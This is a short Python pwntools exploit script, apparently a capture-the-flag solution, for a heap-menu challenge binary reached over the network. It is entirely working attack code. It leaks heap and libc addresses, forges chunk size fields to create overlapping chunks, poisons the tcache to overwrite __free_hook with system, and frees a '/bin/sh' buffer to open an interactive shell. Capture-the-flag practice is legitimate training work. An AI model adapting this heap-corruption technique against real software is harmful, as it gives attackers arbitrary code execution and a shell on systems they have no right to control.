#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
epath = "./chal"
lpath = "./libc.so.6"
e = ELF(epath)
l = ELF(lpath)
#r = process(epath, env={"LD_PRELOAD" : lpath})
#r = process(epath)
r = remote("10.99.111.107", 4241)

def add(idx, sz):
	r.sendlineafter("choice:", str(1))
	r.sendlineafter("index:", str(idx))
	r.sendlineafter("Size:", str(sz))

def delete(idx):
	r.sendlineafter("choice:", str(2))
	r.sendlineafter("index:", str(idx))

def show(idx):
	r.sendlineafter("choice:", str(3))
	r.sendlineafter("index:", str(idx))

def edit(idx, msg):
	r.sendlineafter("choice:", str(4))
	r.sendlineafter("index:", str(idx))
	r.sendafter("Content:", msg)

add(0, 0x18)
add(1, 0x18)
add(2, 0x18)
delete(1)
delete(2)
add(1, 0x18)
show(1)
leak = r.recvline().strip().ljust(8, b"\x00")
heapbase = u64(leak) - 0x2c0
success("heapbase : %s" % hex(heapbase))
delete(0)
delete(1)

for i in range(16):
	add(i, 0x68)
for i in range(0, 16, 2):
	edit(i, p8(0)*0x68 + p8(0xa1))
for i in range(1, 12, 2):
	delete(i)
delete(15)
edit(13, p64(0) + p64(0) + p8(0)*0x58 + p8(0x71))
edit(14, p64(0)*4 + p64(0xa0) + p64(0xb1) + p8(0)*0x38 + p8(0x71))
delete(13) # mchunkptr

for i in range(1, 12, 2):
	add(i, 0x68)

add(15, 0x68)
show(1)
leak = r.recvline().strip().ljust(8, b"\x00")
leak = u64(leak)
success("mchunkptr top : %s" % hex(leak))
l.address = leak - 0x1ecc70 # local 
success("libc : %s" % hex(l.address))

for i in range(16):
	delete(i)

for i in range(4):
	add(i, 0x38)

edit(1, p8(0)*0x38 + p8(0x51))
delete(2)
add(2, 0x48)
delete(0)
delete(3)
edit(2, p8(0)*0x38 + p64(0x41) + p64(l.sym.__free_hook) + p8(0))
add(4, 0x38)
add(5, 0x38)
edit(5, p64(l.sym.system) + p64(0)*0x30 + p8(0))
add(0, 0x18)
edit(0, b"/bin/sh\x00" + b"\x00"*0x11)
delete(0)

r.interactive()
r.close()
